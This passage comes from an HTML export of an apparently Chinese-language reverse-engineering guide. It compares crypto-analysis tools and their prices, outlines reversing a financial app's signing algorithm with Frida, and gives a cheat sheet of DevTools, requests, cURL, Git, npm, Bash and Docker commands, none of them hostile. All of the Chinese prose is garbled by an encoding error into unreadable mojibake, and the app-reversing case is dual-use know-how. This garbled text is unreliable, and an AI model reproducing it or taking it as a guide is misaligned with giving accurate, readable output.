<p><strong>å®˜ç½‘</strong>: https://hex-rays.com/ida-pro/</p>
<p><strong>æ›¿ä»£æ–¹æ¡ˆ</strong>: Ghidraï¼ˆå…è´¹ï¼ŒNSA å¼€æºï¼‰ã€Binary Ninja</p>
<hr />
<h4>JEB Decompiler</h4>
<p><strong>é€‚ç”¨åœºæ™¯</strong>: Android/JavaScript æ··åˆé€†å‘ã€DEX åˆ†æ</p>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>ä¼˜ç§€çš„ Android DEX åç¼–è¯‘</li>
<li>æ”¯æŒ JavaScript/TypeScript åˆ†æ</li>
<li>äº¤äº’å¼åæ··æ·†</li>
<li>å†…ç½®è°ƒè¯•å™¨</li>
</ul>
<p><strong>ä»·æ ¼</strong>: ä¸ªäººç‰ˆ $99/æœˆï¼Œä¸“ä¸šç‰ˆ $249/æœˆ</p>
<p><strong>å®˜ç½‘</strong>: https://www.pnfsoftware.com/</p>
<hr />
<h3>2. å•†ä¸šåŠ å¯†è¯†åˆ«æœåŠ¡</h3>
<h4>Detect It Easy (DiE)</h4>
<p><strong>ç±»å‹</strong>: å…è´¹å·¥å…·ï¼ˆå•†ä¸šçº§è´¨é‡ï¼‰</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨è¯†åˆ« PE/ELF/Mach-O æ–‡ä»¶ä¸­çš„åŠ å¯†ç®—æ³•</li>
<li>æ£€æµ‹åŠ å£³/æ··æ·†æŠ€æœ¯</li>
<li>ç­¾åæ•°æ®åº“æŒç»­æ›´æ–°</li>
</ul>
<p><strong>é€‚ç”¨äº</strong>: Windows/Linux äºŒè¿›åˆ¶åˆ†æ</p>
<p><strong>GitHub</strong>: https://github.com/horsicq/Detect-It-Easy</p>
<hr />
<h4>Fortify Static Code Analyzer</h4>
<p><strong>ç±»å‹</strong>: ä¼ä¸šçº§é™æ€ä»£ç åˆ†æ</p>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨æ£€æµ‹ä»£ç ä¸­çš„åŠ å¯†å¼±ç‚¹</li>
<li>è¯†åˆ«ä¸å®‰å…¨çš„åŠ å¯†å®ç°</li>
<li>åˆè§„æ€§æ£€æŸ¥ï¼ˆOWASPã€PCI DSSï¼‰</li>
</ul>
<p><strong>ä»·æ ¼</strong>: ä¼ä¸šå®šä»·ï¼ˆå¹´è´¹ $50,000+ï¼‰</p>
<p><strong>å®˜ç½‘</strong>: https://www.microfocus.com/en-us/cyberres/application-security/static-code-analyzer</p>
<p><strong>å¼€æºæ›¿ä»£</strong>: Semgrepã€SonarQube</p>
<hr />
<h3>3. äº‘ç«¯åŠ å¯†åˆ†æå¹³å°</h3>
<h4>VirusTotal Intelligence</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>è‡ªåŠ¨è¯†åˆ«æ¶æ„è½¯ä»¶ä¸­çš„åŠ å¯†ç®—æ³•</li>
<li>å¤§è§„æ¨¡æ ·æœ¬åº“äº¤å‰åˆ†æ</li>
<li>API æ¥å£é›†æˆ</li>
</ul>
<p><strong>ä»·æ ¼</strong>:</p>
<ul>
<li>å…è´¹ç‰ˆï¼šæœ‰é™æŸ¥è¯¢</li>
<li>é«˜çº§ç‰ˆï¼š$500/æœˆèµ·</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.virustotal.com/</p>
<p><strong>åº”ç”¨</strong>: æ ·æœ¬å¿«é€Ÿåˆ†æã€åŠ å¯†ç‰¹å¾åº“æŸ¥è¯¢</p>
<hr />
<h4>Hybrid Analysis</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>æ²™ç®±åŠ¨æ€åˆ†æ</li>
<li>è‡ªåŠ¨æå–åŠ å¯†å¯†é’¥</li>
<li>ç½‘ç»œæµé‡è§£å¯†</li>
</ul>
<p><strong>ä»·æ ¼</strong>:</p>
<ul>
<li>å…è´¹ç¤¾åŒºç‰ˆ</li>
<li>ä¼ä¸šç‰ˆï¼šå®šåˆ¶åŒ–å®šä»·</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.hybrid-analysis.com/</p>
<hr />
<h3>4. ä¸“ä¸šå’¨è¯¢æœåŠ¡</h3>
<h4>Trail of Bits (å®‰å…¨å’¨è¯¢)</h4>
<p><strong>æœåŠ¡å†…å®¹</strong>:</p>
<ul>
<li>å®šåˆ¶åŒ–åŠ å¯†ç®—æ³•é€†å‘</li>
<li>æ™ºèƒ½åˆçº¦å®¡è®¡</li>
<li>åè®®åˆ†æ</li>
</ul>
<p><strong>å…¸å‹é¡¹ç›®</strong>: $20,000 - $200,000</p>
<p><strong>å®˜ç½‘</strong>: https://www.trailofbits.com/</p>
<hr />
<h4>NCC Group (Cryptography Services)</h4>
<p><strong>æœåŠ¡å†…å®¹</strong>:</p>
<ul>
<li>åŠ å¯†åè®®è®¾è®¡å®¡æŸ¥</li>
<li>å¯†ç å­¦å®ç°å®¡è®¡</li>
<li>ä¾§ä¿¡é“æ”»å‡»æµ‹è¯•</li>
</ul>
<p><strong>å®˜ç½‘</strong>: https://www.nccgroup.com/</p>
<hr />
<h3>5. å¼€æº vs å•†ä¸šæ–¹æ¡ˆå¯¹æ¯”</h3>
<table>
<thead>
<tr>
  <th>ç»´åº¦</th>
  <th>å¼€æºæ–¹æ¡ˆ</th>
  <th>å•†ä¸šæ–¹æ¡ˆ</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æˆæœ¬</strong></td>
  <td>å…è´¹</td>
  <td>$100/æœˆ - $50,000/å¹´+</td>
</tr>
<tr>
  <td><strong>å­¦ä¹ æ›²çº¿</strong></td>
  <td>ä¸­ç­‰</td>
  <td>è¾ƒä½ï¼ˆæœ‰æ”¯æŒï¼‰</td>
</tr>
<tr>
  <td><strong>åŠŸèƒ½å®Œæ•´æ€§</strong></td>
  <td>åŸºç¡€-ä¸­ç­‰</td>
  <td>é«˜çº§-ä¼ä¸šçº§</td>
</tr>
<tr>
  <td><strong>æ›´æ–°é¢‘ç‡</strong></td>
  <td>ç¤¾åŒºé©±åŠ¨</td>
  <td>å®šæœŸæ›´æ–° + æŠ€æœ¯æ”¯æŒ</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨è§„æ¨¡</strong></td>
  <td>ä¸ªäºº-å°å›¢é˜Ÿ</td>
  <td>ä¸­å¤§å‹ä¼ä¸š</td>
</tr>
<tr>
  <td><strong>æ³•å¾‹åˆè§„</strong></td>
  <td>éœ€è‡ªè¡Œå®¡æŸ¥</td>
  <td>æä¾›åˆè§„ä¿è¯</td>
</tr>
<tr>
  <td><strong>æŠ€æœ¯æ”¯æŒ</strong></td>
  <td>ç¤¾åŒºè®ºå›</td>
  <td>7x24 ä¸“ä¸šæ”¯æŒ</td>
</tr>
</tbody>
</table>
<hr />
<h3>6. æ¨èæŠ€æœ¯é€‰å‹</h3>
<h4>ä¸ªäººå­¦ä¹ /å°å›¢é˜Ÿ</h4>
<p><strong>æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>CyberChefï¼ˆåœ¨çº¿åˆ†æï¼‰</li>
<li>Cipheyï¼ˆè‡ªåŠ¨è§£å¯†ï¼‰</li>
<li>è‡ªå»ºæ£€æµ‹è„šæœ¬</li>
</ul>
<p><strong>æˆæœ¬</strong>: $0</p>
<hr />
<h4>åˆåˆ›å…¬å¸/ä¸­å°ä¼ä¸š</h4>
<p><strong>æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>JEB Decompilerï¼ˆ$99-249/æœˆï¼‰</li>
<li>VirusTotal Intelligenceï¼ˆ$500/æœˆï¼‰</li>
<li>å¼€æºå·¥å…· + å•†ä¸šå·¥å…·ç»„åˆ</li>
</ul>
<p><strong>æˆæœ¬</strong>: $1,000-3,000/æœˆ</p>
<hr />
<h4>å¤§å‹ä¼ä¸š/å®‰å…¨å…¬å¸</h4>
<p><strong>æ–¹æ¡ˆ</strong>:</p>
<ul>
<li>IDA Pro å›¢é˜Ÿè®¸å¯</li>
<li>Fortify/Checkmarx ä¼ä¸šç‰ˆ</li>
<li>ä¸“ä¸šå’¨è¯¢æœåŠ¡ï¼ˆæŒ‰éœ€ï¼‰</li>
</ul>
<p><strong>æˆæœ¬</strong>: $50,000-200,000/å¹´</p>
<hr />
<h3>7. æ–°å…´è¶‹åŠ¿ï¼šAI é©±åŠ¨çš„åŠ å¯†åˆ†æ</h3>
<h4>Anthropic Claude/OpenAI GPT (LLM è¾…åŠ©)</h4>
<p><strong>åº”ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>ä»£ç ç‰‡æ®µå¿«é€Ÿåˆ†æ</li>
<li>åŠ å¯†ç®—æ³•è¯†åˆ«è¾…åŠ©</li>
<li>ä¼ªä»£ç ç”Ÿæˆ</li>
</ul>
<p><strong>å±€é™æ€§</strong>:</p>
<ul>
<li>æ— æ³•å¤„ç†å¤§è§„æ¨¡ä»£ç </li>
<li>å¯èƒ½äº§ç”Ÿè¯¯åˆ¤</li>
<li>ä¸é€‚åˆä¿å¯†é¡¹ç›®</li>
</ul>
<p><strong>æˆæœ¬</strong>: API è°ƒç”¨è´¹ç”¨ï¼ˆ$0.01-0.06/1K tokensï¼‰</p>
<hr />
<h4>Zerocopter AI Code Analysis</h4>
<p><strong>åŠŸèƒ½</strong>:</p>
<ul>
<li>AI é©±åŠ¨çš„æ¼æ´æ£€æµ‹</li>
<li>è‡ªåŠ¨è¯†åˆ«åŠ å¯†å¼±ç‚¹</li>
<li>æ™ºèƒ½æ¨èä¿®å¤æ–¹æ¡ˆ</li>
</ul>
<p><strong>çŠ¶æ€</strong>: æµ‹è¯•é˜¶æ®µ</p>
<hr />
<h3>8. å®é™…æ¡ˆä¾‹å¯¹æ¯”</h3>
<h4>æ¡ˆä¾‹: æŸé‡‘è APP åŠ å¯†é€†å‘</h4>
<p><strong>éœ€æ±‚</strong>: è¯†åˆ«å¹¶å¤ç°äº¤æ˜“ç­¾åç®—æ³•</p>
<p><strong>æ–¹æ¡ˆ Aï¼ˆå¼€æºï¼‰</strong>:</p>
<ul>
<li>å·¥å…·: Frida + è‡ªå†™ Hook è„šæœ¬</li>
<li>æ—¶é—´: 3-5 å¤©</li>
<li>æˆæœ¬: $0</li>
<li>é£é™©: éœ€è¦ä¸“ä¸šæŠ€èƒ½</li>
</ul>
<p><strong>æ–¹æ¡ˆ Bï¼ˆå•†ä¸šï¼‰</strong>:</p>
<ul>
<li>å·¥å…·: JEB Decompiler + Trail of Bits å’¨è¯¢</li>
<li>æ—¶é—´: 1-2 å¤©</li>
<li>æˆæœ¬: $5,000-15,000</li>
<li>é£é™©: ä½ï¼Œæœ‰ä¸“ä¸šä¿éšœ</li>
</ul>
<p><strong>ç»“è®º</strong>: ç´§æ€¥é¡¹ç›®æˆ–ç¼ºä¹ç»éªŒæ—¶ï¼Œå•†ä¸šæ–¹æ¡ˆ ROI æ›´é«˜</p>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-58">JavaScript Hook è„šæœ¬</a></li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
<li>å¸¸è§åŠ å¯†ç®—æ³•åˆ†æ</li>
</ul>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part VIII: Reference</h1>
                    
                                            <div class="section" id="section-62">
                                                <h2>[R61] Overview</h2>
                                                <h1>R61: é€ŸæŸ¥è¡¨ - Cheat Sheets</h1>
<p>å¿«é€Ÿå‚è€ƒæ‰‹å†Œï¼Œå¸®åŠ©ä½ åœ¨é€†å‘è¿‡ç¨‹ä¸­å¿«é€ŸæŸ¥æ‰¾å¸¸ç”¨å‘½ä»¤ã€ç‰¹å¾å’Œé…ç½®ã€‚</p>
<hr />
<h2>ğŸ“š å¯ç”¨é€ŸæŸ¥è¡¨</h2>
<h3>ğŸ–¥ï¸ <a href="#section-63">å¸¸ç”¨å‘½ä»¤</a></h3>
<ul>
<li>Chrome DevTools å‘½ä»¤</li>
<li>Python å¸¸ç”¨åº“ç”¨æ³•</li>
<li>cURL å‘½ä»¤ç¤ºä¾‹</li>
<li>Git å¸¸ç”¨æ“ä½œ</li>
</ul>
<h3>ğŸ” <a href="#section-64">åŠ å¯†ç®—æ³•ç‰¹å¾</a></h3>
<ul>
<li>MD5/SHA/AES è¯†åˆ«ç‰¹å¾</li>
<li>å¸¸è§åŠ å¯†åº“ç‰¹å¾ç </li>
<li>è¾“å‡ºæ ¼å¼å¯¹ç…§è¡¨</li>
<li>åŠ å¯†ç®—æ³•å‚æ•°</li>
</ul>
<h3>âŒ¨ï¸ <a href="#section-65">å·¥å…·å¿«æ·é”®</a></h3>
<ul>
<li>Chrome DevTools å¿«æ·é”®</li>
<li>VS Code å¿«æ·é”®</li>
<li>Burp Suite å¿«æ·é”®</li>
<li>å¸¸ç”¨å·¥å…·å¿«æ·æ“ä½œ</li>
</ul>
<h3>ğŸ” <a href="#section-66">æ­£åˆ™è¡¨è¾¾å¼</a></h3>
<ul>
<li>URL åŒ¹é…æ¨¡å¼</li>
<li>å¸¸è§åŠ å¯†ç‰¹å¾æ­£åˆ™</li>
<li>æ•°æ®æå–æ­£åˆ™</li>
<li>éªŒè¯è§„åˆ™æ­£åˆ™</li>
</ul>
<h3>ğŸŒ <a href="#section-67">HTTP å¤´é€ŸæŸ¥</a></h3>
<ul>
<li>å¸¸è§è¯·æ±‚å¤´</li>
<li>å¸¸è§å“åº”å¤´</li>
<li>å®‰å…¨ç›¸å…³å¤´</li>
<li>è‡ªå®šä¹‰å¤´ç¤ºä¾‹</li>
</ul>
<hr />
<h2>ğŸ’¡ å¦‚ä½•ä½¿ç”¨</h2>
<p>æ¯ä¸ªé€ŸæŸ¥è¡¨éƒ½é‡‡ç”¨è¡¨æ ¼æˆ–åˆ—è¡¨æ ¼å¼ï¼Œæ–¹ä¾¿å¿«é€ŸæŸ¥æ‰¾ï¼š</p>
<ul>
<li><strong>åˆ†ç±»æ¸…æ™°</strong>: æŒ‰åŠŸèƒ½åˆ†ç»„</li>
<li><strong>ç¤ºä¾‹ä¸°å¯Œ</strong>: æ¯ä¸ªæ¡ç›®éƒ½æœ‰ç¤ºä¾‹</li>
<li><strong>å³æŸ¥å³ç”¨</strong>: å¯ç›´æ¥å¤åˆ¶ç²˜è´´</li>
</ul>
<hr />
<h2>ğŸ”– æ¨èæ”¶è—</h2>
<p>å°†è¿™ä¸ªé¡µé¢æ·»åŠ ä¸ºæµè§ˆå™¨ä¹¦ç­¾ï¼Œæ–¹ä¾¿éšæ—¶æŸ¥é˜…ï¼š</p>
<pre><code>Ctrl+D (Windows/Linux)
Cmd+D (macOS)
</code></pre>
<hr />
<h2>ğŸ“¥ ç¦»çº¿ä½¿ç”¨</h2>
<p>ä½ å¯ä»¥å°†æ•´ä¸ªæ–‡æ¡£å¯¼å‡ºä¸º PDFï¼š</p>
<pre><code class="language-bash">mkdocs build
# ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ site/index.html
# æ‰“å°ä¸º PDF
</code></pre>
<hr />
<h2>ğŸ†˜ æ‰¾ä¸åˆ°æƒ³è¦çš„å†…å®¹ï¼Ÿ</h2>
<p>å¦‚æœé€ŸæŸ¥è¡¨ä¸­æ²¡æœ‰ä½ éœ€è¦çš„å†…å®¹ï¼š</p>
<ol>
<li>æŸ¥çœ‹ <a href="#section-83">FAQ</a></li>
<li>æŸ¥çœ‹ <a href="../10-Troubleshooting/">Troubleshooting</a></li>
<li>æŸ¥çœ‹å…·ä½“çš„æŠ€æœ¯ç« èŠ‚</li>
</ol>
<hr />
<p>Happy Referencing! ğŸ“–</p>

                                            </div>
                                            
                                            <div class="section" id="section-63">
                                                <h2>[R62] Common Commands</h2>
                                                <h1>R62: å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨</h1>
<h2>Chrome DevTools Console å‘½ä»¤</h2>
<h3>é€‰æ‹©å…ƒç´ </h3>
<table>
<thead>
<tr>
  <th>å‘½ä»¤</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>$()</code></td>
  <td>ç­‰åŒäº <code>document.querySelector()</code></td>
  <td><code>$('#username')</code></td>
</tr>
<tr>
  <td><code>$$()</code></td>
  <td>ç­‰åŒäº <code>document.querySelectorAll()</code></td>
  <td><code>$$('.item')</code></td>
</tr>
<tr>
  <td><code>$x()</code></td>
  <td>XPath é€‰æ‹©å™¨</td>
  <td><code>$x('//div[@class=&quot;container&quot;]')</code></td>
</tr>
<tr>
  <td><code>$0</code></td>
  <td>å½“å‰é€‰ä¸­çš„å…ƒç´ </td>
  <td><code>$0.innerHTML</code></td>
</tr>
<tr>
  <td><code>$1</code></td>
  <td>ä¸Šä¸€ä¸ªé€‰ä¸­çš„å…ƒç´ </td>
  <td><code>$1.classList</code></td>
</tr>
</tbody>
</table>
<h3>å®ç”¨å‡½æ•°</h3>
<table>
<thead>
<tr>
  <th>å‘½ä»¤</th>
  <th>è¯´æ˜</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>copy()</code></td>
  <td>å¤åˆ¶åˆ°å‰ªè´´æ¿</td>
  <td><code>copy($0)</code></td>
</tr>
<tr>
  <td><code>clear()</code></td>
  <td>æ¸…ç©º Console</td>
  <td><code>clear()</code></td>
</tr>
<tr>
  <td><code>keys()</code></td>
  <td>è·å–å¯¹è±¡æ‰€æœ‰é”®</td>
  <td><code>keys(window)</code></td>
</tr>
<tr>
  <td><code>values()</code></td>
  <td>è·å–å¯¹è±¡æ‰€æœ‰å€¼</td>
  <td><code>values(localStorage)</code></td>
</tr>
<tr>
  <td><code>monitor()</code></td>
  <td>ç›‘æ§å‡½æ•°è°ƒç”¨</td>
  <td><code>monitor(fetch)</code></td>
</tr>
<tr>
  <td><code>unmonitor()</code></td>
  <td>å–æ¶ˆç›‘æ§</td>
  <td><code>unmonitor(fetch)</code></td>
</tr>
<tr>
  <td><code>table()</code></td>
  <td>è¡¨æ ¼æ˜¾ç¤ºæ•°æ®</td>
  <td><code>table([{name:'a',age:20}])</code></td>
</tr>
<tr>
  <td><code>debug()</code></td>
  <td>åœ¨å‡½æ•°ç¬¬ä¸€è¡Œè®¾æ–­ç‚¹</td>
  <td><code>debug(myFunction)</code></td>
</tr>
<tr>
  <td><code>undebug()</code></td>
  <td>ç§»é™¤æ–­ç‚¹</td>
  <td><code>undebug(myFunction)</code></td>
</tr>
</tbody>
</table>
<h3>ç½‘ç»œç›¸å…³</h3>
<pre><code class="language-javascript">// æŸ¥çœ‹æ‰€æœ‰ Cookie
document.cookie;

// æ¸…ç©ºæ‰€æœ‰ Cookie
document.cookie.split(&quot;;&quot;).forEach((c) =&gt; {
  document.cookie = c
    .replace(/^ +/, &quot;&quot;)
    .replace(/=.*/, &quot;=;expires=&quot; + new Date().toUTCString() + &quot;;path=/&quot;);
});

// æŸ¥çœ‹ LocalStorage
Object.keys(localStorage);

// æ¸…ç©º LocalStorage
localStorage.clear();

// å‘é€ GET è¯·æ±‚
fetch(&quot;https://api.example.com/data&quot;)
  .then((r) =&gt; r.json())
  .then(console.log);

// å‘é€ POST è¯·æ±‚
fetch(&quot;https://api.example.com/login&quot;, {
  method: &quot;POST&quot;,
  headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
  body: JSON.stringify({ username: &quot;admin&quot;, password: &quot;123456&quot; }),
})
  .then((r) =&gt; r.json())
  .then(console.log);
</code></pre>
<hr />
<h2>Python å¸¸ç”¨åº“</h2>
<h3>Requests</h3>
<pre><code class="language-python">import requests

# GET è¯·æ±‚
response = requests.get('https://example.com')
print(response.text)

# POST è¯·æ±‚
response = requests.post('https://example.com/api', json={
    'username': 'admin',
    'password': '123456'
})
print(response.json())

# è®¾ç½® Headers
headers = {
    'User-Agent': 'Mozilla/5.0 ...',
    'Authorization': 'Bearer token123'
}
response = requests.get('https://example.com', headers=headers)

# ä½¿ç”¨ä»£ç†
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
response = requests.get('https://example.com', proxies=proxies)

# Session ä¿æŒ
session = requests.Session()
session.get('https://example.com/login')
session.post('https://example.com/api', json={'key': 'value'})
</code></pre>
<h3>BeautifulSoup</h3>
<pre><code class="language-python">from bs4 import BeautifulSoup

# è§£æ HTML
soup = BeautifulSoup(html, 'html.parser')

# æŸ¥æ‰¾å…ƒç´ 
soup.find('div', class_='content')          # æŸ¥æ‰¾ç¬¬ä¸€ä¸ª
soup.find_all('a')                          # æŸ¥æ‰¾æ‰€æœ‰
soup.select('.class #id tag')               # CSS é€‰æ‹©å™¨

# è·å–å±æ€§
element = soup.find('a')
element.get('href')                         # è·å– href
element.text                                # è·å–æ–‡æœ¬
element.get_text(strip=True)                # è·å–æ–‡æœ¬ï¼ˆå»ç©ºæ ¼ï¼‰
</code></pre>
<h3>Regex (re)</h3>
<pre><code class="language-python">import re

# æŸ¥æ‰¾
match = re.search(r'pattern', text)
matches = re.findall(r'pattern', text)

# æ›¿æ¢
result = re.sub(r'old', 'new', text)

# ç¼–è¯‘ï¼ˆæé«˜æ€§èƒ½ï¼‰
pattern = re.compile(r'pattern')
matches = pattern.findall(text)
</code></pre>
<hr />
<h2>cURL å‘½ä»¤</h2>
<h3>åŸºæœ¬ç”¨æ³•</h3>
<pre><code class="language-bash"># GET è¯·æ±‚
curl https://example.com

# POST è¯·æ±‚
curl -X POST https://example.com/api \
  -H &quot;Content-Type: application/json&quot; \
  -d '{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}'

# è®¾ç½® User-Agent
curl -A &quot;Mozilla/5.0 ...&quot; https://example.com

# ä¿å­˜ Cookie
curl -c cookies.txt https://example.com

# ä½¿ç”¨ Cookie
curl -b cookies.txt https://example.com

# è·Ÿéšé‡å®šå‘
curl -L https://example.com

# æ˜¾ç¤ºå“åº”å¤´
curl -i https://example.com

# åªæ˜¾ç¤ºå“åº”å¤´
curl -I https://example.com

# ä½¿ç”¨ä»£ç†
curl -x http://127.0.0.1:8080 https://example.com

# å¿½ç•¥ SSL è¯ä¹¦
curl -k https://example.com

# ä¸Šä¼ æ–‡ä»¶
curl -F &quot;file=@/path/to/file&quot; https://example.com/upload
</code></pre>
<h3>è°ƒè¯•ç”¨æ³•</h3>
<pre><code class="language-bash"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
curl -v https://example.com

# æ˜¾ç¤ºæ—¶é—´ç»Ÿè®¡
curl -w &quot;@curl-format.txt&quot; -o /dev/null -s https://example.com

# curl-format.txt å†…å®¹:
#     time_namelookup:  %{time_namelookup}\n
#        time_connect:  %{time_connect}\n
#     time_appconnect:  %{time_appconnect}\n
#       time_redirect:  %{time_redirect}\n
#    time_pretransfer:  %{time_pretransfer}\n
#  time_starttransfer:  %{time_starttransfer}\n
#                     ----------\n
#          time_total:  %{time_total}\n
</code></pre>
<hr />
<h2>Git å¸¸ç”¨å‘½ä»¤</h2>
<h3>åŸºç¡€æ“ä½œ</h3>
<pre><code class="language-bash"># æŸ¥çœ‹çŠ¶æ€
git status

# æ·»åŠ æ–‡ä»¶
git add .
git add file.txt

# æäº¤
git commit -m &quot;message&quot;

# æ¨é€
git push origin master

# æ‹‰å–
git pull origin master

# æŸ¥çœ‹å†å²
git log
git log --oneline --graph

# å›é€€
git reset --hard HEAD^       # å›é€€ä¸€ä¸ªç‰ˆæœ¬
git reset --hard commit_id   # å›é€€åˆ°æŒ‡å®šç‰ˆæœ¬
</code></pre>
<h3>åˆ†æ”¯æ“ä½œ</h3>
<pre><code class="language-bash"># åˆ›å»ºåˆ†æ”¯
git branch feature-name

# åˆ‡æ¢åˆ†æ”¯
git checkout feature-name

# åˆ›å»ºå¹¶åˆ‡æ¢
git checkout -b feature-name

# åˆå¹¶åˆ†æ”¯
git merge feature-name

# åˆ é™¤åˆ†æ”¯
git branch -d feature-name
</code></pre>
<h3>æŸ¥çœ‹å·®å¼‚</h3>
<pre><code class="language-bash"># æŸ¥çœ‹ä¿®æ”¹
git diff

# æŸ¥çœ‹å·²æš‚å­˜çš„ä¿®æ”¹
git diff --staged

# æŸ¥çœ‹ä¸¤ä¸ªæäº¤çš„å·®å¼‚
git diff commit1 commit2
</code></pre>
<hr />
<h2>Node.js / npm</h2>
<h3>åŒ…ç®¡ç†</h3>
<pre><code class="language-bash"># å®‰è£…åŒ…
npm install package-name
npm install -g package-name     # å…¨å±€å®‰è£…
npm install --save-dev package  # å¼€å‘ä¾èµ–

# å¸è½½åŒ…
npm uninstall package-name

# æ›´æ–°åŒ…
npm update package-name

# æŸ¥çœ‹å·²å®‰è£…çš„åŒ…
npm list
npm list -g

# æŸ¥çœ‹åŒ…ä¿¡æ¯
npm info package-name
</code></pre>
<h3>å¸¸ç”¨è„šæœ¬</h3>
<pre><code class="language-bash"># è¿è¡Œè„šæœ¬
npm run script-name

# å¸¸è§çš„é¢„å®šä¹‰è„šæœ¬
npm start
npm test
npm run build
</code></pre>
<hr />
<h2>Bash æ–‡æœ¬å¤„ç†</h2>
<h3>grep</h3>
<pre><code class="language-bash"># æœç´¢æ–‡æœ¬
grep &quot;pattern&quot; file.txt

# å¿½ç•¥å¤§å°å†™
grep -i &quot;pattern&quot; file.txt

# é€’å½’æœç´¢
grep -r &quot;pattern&quot; directory/

# æ˜¾ç¤ºè¡Œå·
grep -n &quot;pattern&quot; file.txt

# åå‘åŒ¹é…ï¼ˆä¸åŒ…å«ï¼‰
grep -v &quot;pattern&quot; file.txt

# æ­£åˆ™è¡¨è¾¾å¼
grep -E &quot;regex pattern&quot; file.txt
</code></pre>
<h3>sed</h3>
<pre><code class="language-bash"># æ›¿æ¢æ–‡æœ¬
sed 's/old/new/' file.txt           # æ›¿æ¢æ¯è¡Œç¬¬ä¸€ä¸ª
sed 's/old/new/g' file.txt          # æ›¿æ¢æ‰€æœ‰
sed -i 's/old/new/g' file.txt       # ç›´æ¥ä¿®æ”¹æ–‡ä»¶

# åˆ é™¤è¡Œ
sed '/pattern/d' file.txt           # åˆ é™¤åŒ¹é…çš„è¡Œ
sed '1d' file.txt                   # åˆ é™¤ç¬¬ä¸€è¡Œ
sed '1,10d' file.txt                # åˆ é™¤1-10è¡Œ
</code></pre>
<h3>awk</h3>
<pre><code class="language-bash"># æ‰“å°åˆ—
awk '{print $1}' file.txt           # æ‰“å°ç¬¬ä¸€åˆ—
awk '{print $1,$3}' file.txt        # æ‰“å°ç¬¬1å’Œç¬¬3åˆ—

# æ¡ä»¶è¿‡æ»¤
awk '$3 &gt; 100' file.txt             # ç¬¬3åˆ—å¤§äº100çš„è¡Œ

# æ±‚å’Œ
awk '{sum+=$1} END {print sum}' file.txt
</code></pre>
<hr />
<h2>Docker å¸¸ç”¨å‘½ä»¤</h2>
<h3>é•œåƒæ“ä½œ</h3>
<pre><code class="language-bash"># æ‹‰å–é•œåƒ
docker pull image-name

# æŸ¥çœ‹é•œåƒ
docker images

# åˆ é™¤é•œåƒ
docker rmi image-name

# æ„å»ºé•œåƒ
docker build -t image-name .
</code></pre>
<h3>å®¹å™¨æ“ä½œ</h3>
<pre><code class="language-bash"># è¿è¡Œå®¹å™¨
docker run -d --name container-name image-name
docker run -it image-name /bin/bash      # äº¤äº’å¼

# æŸ¥çœ‹å®¹å™¨
docker ps           # è¿è¡Œä¸­çš„
docker ps -a        # æ‰€æœ‰çš„

# åœæ­¢å®¹å™¨
docker stop container-name

# å¯åŠ¨å®¹å™¨
docker start container-name

# åˆ é™¤å®¹å™¨
docker rm container-name

# æŸ¥çœ‹æ—¥å¿—
docker logs container-name

# è¿›å…¥å®¹å™¨
docker exec -it container-name /bin/bash
</code></pre>
<hr />
<h2>å¿«é€Ÿå‚è€ƒ</h2>
<h3>ç¼–ç /è§£ç </h3>
<pre><code class="language-python"># Base64
import base64
encoded = base64.b64encode(b'text')
decoded = base64.b64decode(encoded)

# URLç¼–ç 
from urllib.parse import quote, unquote
encoded = quote('text with spaces')
decoded = unquote(encoded)

# JSON
import json
json_str = json.dumps({'key': 'value'})
obj = json.loads(json_str)
</code></pre>
<h3>æ—¶é—´æˆ³</h3>
<pre><code class="language-python">import time
import datetime

# å½“å‰æ—¶é—´æˆ³ï¼ˆç§’ï¼‰
timestamp = int(time.time())

# å½“å‰æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰
timestamp_ms = int(time.time() * 1000)

# æ—¶é—´æˆ³è½¬æ—¥æœŸ
dt = datetime.datetime.fromtimestamp(timestamp)
print(dt.strftime('%Y-%m-%d %H:%M:%S'))

# æ—¥æœŸè½¬æ—¶é—´æˆ³
dt = datetime.datetime(2024, 1, 1, 12, 0, 0)
timestamp = int(dt.timestamp())
</code></pre>
<pre><code class="language-javascript">// JavaScript
const timestamp = Date.now(); // æ¯«ç§’
const timestampSec = Math.floor(Date.now() / 1000); // ç§’

// æ—¶é—´æˆ³è½¬æ—¥æœŸ
const date = new Date(timestamp);
console.log(date.toLocaleString());
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-64">åŠ å¯†ç®—æ³•ç‰¹å¾</a> - åŠ å¯†ç®—æ³•è¯†åˆ«</li>
<li><a href="#section-66">æ­£åˆ™è¡¨è¾¾å¼</a> - å¸¸ç”¨æ­£åˆ™æ¨¡å¼</li>
<li><a href="#section-67">HTTP å¤´é€ŸæŸ¥</a> - HTTP è¯·æ±‚å¤´</li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-64">
                                                <h2>[R63] Crypto Signatures</h2>
